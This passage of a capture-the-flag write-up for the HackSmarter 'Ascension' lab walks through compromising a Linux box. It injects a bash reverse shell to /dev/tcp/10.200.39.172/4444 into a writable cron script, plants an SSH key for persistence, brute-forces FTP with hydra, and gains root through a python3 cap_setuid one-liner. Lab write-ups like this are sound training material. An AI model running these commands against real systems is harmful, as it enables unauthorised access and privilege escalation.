+<span class="hljs-number">2026</span><span class="hljs-regexp">/01/</span><span class="hljs-number">29</span> <span class="hljs-number">22</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">1002</span>  PID=<span class="hljs-number">1665</span>   | <span class="hljs-regexp">/bin/</span>sh -c <span class="hljs-regexp">/tmp/</span>backup.sh
+</code></pre><p>If you dont know what is cronjob:
+Its running jobs on repeating schedule. 
+So potentially we can abuse it to execute reverse shell. And gain access to user2.</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/cronjob.png"></div>
+<p>Now add reverse shell in the <code>backup.sh</code> file.</p>
+<pre><code><span class="hljs-meta">#!/bin/bash
+</span>
+bash -c <span class="hljs-string">'exec bash -i &amp;&gt;/dev/tcp/10.200.39.172/4444 &lt;&amp;1'</span>
+</code></pre><p>Also dont forget to make it executable:</p>
+<pre><code>user1<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">19</span>-<span class="hljs-number">75</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>chmod +x backup.sh
+</code></pre><p>And set-up listener on our main machine on port <code>4444</code>.</p>
+<pre><code>nc -lvnp <span class="hljs-number">4444</span>
+</code></pre><p>After that we have to wait for the cronjob to get running, and potentially obtain ReverseShell for User2.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/user2 netcat.png"></div>
+</p>
+<p>As you can see we successfully Gain Access to User2.
+But now our shell is unstable. To fix this problem we have multiple choices. But we are able to access <code>.ssh</code> file. So we can add our <code>ssh-key</code> into the <code>.ssh</code> file.</p>
+<h3 id="stabilizing-user2-shell-">Stabilizing User2 Shell:</h3>
+<p>Generating SSH-key on our main machine:</p>
+<pre><code><span class="hljs-attribute">ssh-keygen</span>
+</code></pre><p><div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/generating ssh key.png"></div>
+Now move into the <code>.ssh</code> directory and copy the public key.</p>
+<pre><code>ssh-ed<span class="hljs-number">25519</span> AAAAC<span class="hljs-number">3</span><span class="hljs-symbol">NzaC1</span>lZDI<span class="hljs-number">1</span><span class="hljs-symbol">NTE5</span>AAAAIHrib<span class="hljs-number">8</span>y<span class="hljs-number">0</span>PThjGT<span class="hljs-number">9</span>LLhH<span class="hljs-name">m3</span>bBlk<span class="hljs-number">4</span>qUpF<span class="hljs-number">7</span>dmEBum+JitC/A sh<span class="hljs-number">13</span>ld@kali
+</code></pre><p>Now we have to copy this into the target machine. 
+But since the <code>user2</code> dont have <code>.ssh</code> directory we have to create it.</p>
+<pre><code>user2@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-19</span><span class="hljs-string">-75</span>:~$ pwd   
+pwd
+/home/user2
+user2@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-19</span><span class="hljs-string">-75</span>:~$ mkdir .ssh
+mkdir .ssh
+user2@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-19</span><span class="hljs-string">-75</span>:~$ ls -la
+ls -la
+total 24
+drwxr-x--- 3 user2 user2 4096 Mar 25 00:35 .
+drwxr-xr-x 7 root  root  4096 Sep 19  2025 ..
+-rw-r--r-- 1 user2 user2  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 user2 user2 3771 Mar 31  2024 .bashrc
+-rw-r--r-- 1 user2 user2  807 Mar 31  2024 .profile
+drwxrwxr-x 2 user2 user2 4096 Mar 25 00:35 .ssh
+user2@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-19</span><span class="hljs-string">-75</span>:~$ cd .ssh
+cd .ssh
+user2@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-19</span><span class="hljs-string">-75</span>:~/.ssh$ touch authorized_keys  
+touch authorized_keys
+user2@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-19</span><span class="hljs-string">-75</span>:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHrib8y0PThjGT9LLhHm3bBlk4qUpF7dmEBum+JitC/A sh13ld@kali &gt; authorized_keys
+user2@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-19</span><span class="hljs-string">-75</span>:~/.ssh$ chmod +x authorized_keys
+</code></pre><p>Now simply log in via SSH:</p>
+<pre><code><span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">user2</span>@<span class="hljs-keyword">ascension</span>.<span class="hljs-keyword">hsm</span>
+</code></pre><div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Log-in as user2.png"></div>
+<p>Now when we have a stable shell we can go and get the flag for the user2. Which is in the <code>/opt/user2</code> Directory.</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Flag2.png"></div>
+<h1 id="compromising-ftp-user">Compromising FTP User</h1>
+<p>We can try to bruteforce the password for the FTP user with the <code>pwlist.txt</code> which we obtained earlier.</p>
+<pre><code>hydra -l ftpuser -P pwlist<span class="hljs-selector-class">.txt</span> ftp:<span class="hljs-comment">//ascension.hsm</span>
+</code></pre><p>And we successfully crack the password.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/FTP cracked password.png"></div>
+</p>
+<p>Now we can use command:</p>
+<pre><code><span class="hljs-attribute">su ftpuser</span>
+</code></pre>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Log-in as ftpuser.png"></div>
+<p>And now as you can see we are log-in as <code>ftpuser</code>.</p>
+<p>So lets dig into <code>/opt/ftpuser</code> directory and read the 3rd flag.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Flag3.png"></div>
+</p>
+<h1 id="compromising-user3">Compromising User3</h1>
+<p>The hint telling us the 4th Flag is in the mysql database.</p>
+<p>So we can simply log in with the credentials which we obtain earlier.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/mysql login.png"></div>
+</p>
+<p>And here it is the 4th Flag.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Flag4.png"></div>
+</p>
+<p>Also inside the DB we can spot table with users. When we open it up we get the credentails for the user3.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/User3 credentials.png"></div>
+</p>
+<p>Now we should be able to Log-in with these credentials as <code>user3</code> via SSH.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Log-in as user3.png"></div>
+And we was able. Now when we navigate into <code>/opt/user3</code> Directory we get a flag for the user3. This is a 5th flag btw.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Flag5.png"></div>
+</p>
+<h1 id="privilege-escalation-user3-root">Privilege Escalation User3 -&gt; Root</h1>
+<p>sudo -l</p>
+<pre><code>user3<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">19</span>-<span class="hljs-number">75</span><span class="hljs-symbol">:/home/user2</span><span class="hljs-variable">$ </span>sudo -l
+[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-symbol">user3:</span> 
+Sorry, user user3 may <span class="hljs-keyword">not</span> run sudo on ip-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">19</span>-<span class="hljs-number">75</span>.
+</code></pre><p>id</p>
+<pre><code>uid=1003(<span class="hljs-name">user3</span>) gid=1003(<span class="hljs-name">user3</span>) groups=1003(<span class="hljs-name">user3</span>)
+</code></pre><p>Linux capabilities allow a subset of root privileges to be assigned to specific files or processes. This is a common privilege escalation vector in CTFs. The <code>getcap</code> command was used to search the entire filesystem for binaries with set capabilities.</p>
+<pre><code>getcap -r <span class="hljs-regexp">/ 2&gt;/</span>dev/<span class="hljs-literal">null</span>
+</code></pre><pre><code>user3<span class="hljs-meta">@ip</span><span class="hljs-number">-10</span><span class="hljs-number">-0</span><span class="hljs-number">-19</span><span class="hljs-number">-75</span>:<span class="hljs-regexp">/home/</span>user2$ getcap -r <span class="hljs-regexp">/ 2&gt;/</span>dev/<span class="hljs-literal">null</span>
+<span class="hljs-regexp">/home/</span>user3/python3 cap_setuid=ep
+<span class="hljs-regexp">/snap/</span>core22<span class="hljs-regexp">/2111/</span>usr<span class="hljs-regexp">/bin/</span>ping cap_net_raw=ep
+<span class="hljs-regexp">/snap/</span>core22<span class="hljs-regexp">/2133/</span>usr<span class="hljs-regexp">/bin/</span>ping cap_net_raw=ep
+<span class="hljs-regexp">/snap/</span>snapd<span class="hljs-regexp">/25202/</span>usr<span class="hljs-regexp">/lib/</span>snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
+<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>gstreamer1<span class="hljs-number">.0</span><span class="hljs-regexp">/gstreamer-1.0/</span>gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+<span class="hljs-regexp">/usr/</span>bin/mtr-packet cap_net_raw=ep
+<span class="hljs-regexp">/usr/</span>bin/ping cap_net_raw=ep
+</code></pre><p>Here you can spot <code>/home/user3/python3 cap_setuid=ep</code></p>
+<p>It is a misconfiguration which we can use to privilege escalation.
+When we check <a href="https://gtfobins.org" target="_blank">GTOBins</a> and navigate to <code>cap_setuid</code> we find this interesting way of how to make privilege escalation.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/GTOBins.png"></div>
+</p>
+<p>So when we run this command it should grant us root access:</p>
+<pre><code>./python3 -c 'import <span class="hljs-keyword">os</span>; <span class="hljs-keyword">os</span>.setuid(<span class="hljs-number">0</span>); <span class="hljs-keyword">os</span>.system(<span class="hljs-string">"/bin/sh"</span>)'
+</code></pre><p>But firstly we have to navigate in this directory where we have python3 
+<code>/home/user3</code></p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/root access.png"></div>
+<p>We successfully obtain Root access.
+Now navigate to <code>/opt/root</code> and get the final flag for user6.</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Flag6.png"></div>
+<h2 id="attack-path-summary-">Attack Path Summary:</h2>
+<pre><code>
+<span class="hljs-number">1.</span> Anonymous FTP exposed password <span class="hljs-type">list</span>
+<span class="hljs-number">2.</span> NFS share exposed SSH private <span class="hljs-type">key</span>
+<span class="hljs-number">3.</span> Cracked SSH passphrase → user1
+<span class="hljs-number">4.</span> Writable cronjob → user2
+<span class="hljs-number">5.</span> Weak Password → ftpuser
+<span class="hljs-number">6.</span> Database credentials → user3
+<span class="hljs-number">7.</span> Misconfigured Linux capability → root
+</code></pre><h1 id="note-">Note:</h1>
+<p>Big shout-out to Tyler Ramsbey who builded HackSmarter and also huge thanks to author of this room:  <a href="https://www.linkedin.com/in/ryan-yager-442a4964/" target="_blank">Ryan Yager</a>.</p>
+<p>Ps: If you get stuck try to find a solution by yourself. It gonna improve your skill rapidly. Even when it takes lot of time it is worth to struggle.</p>
+
+
+</main>
+
+<!-- RIGHT SIDEBAR -->
+<aside class="sidebar-right">
+<div class="social-box">
+<h4>Social</h4>
+<a href="https://github.com/LumiryX" target="_blank">GitHub</a>
+<a href="https://discordapp.com/users/340045438990286850" target="_blank">Discord</a>
+<a href="https://www.youtube.com/@LumiryX-SecureShield" target="_blank">YouTube</a>
+</div>
+</aside>
+</div>
+<footer>
+
+© 2026 LumiryX 
+
+</footer>
+<script src="/js/script.js"></script>
+
+</body>
+</html>
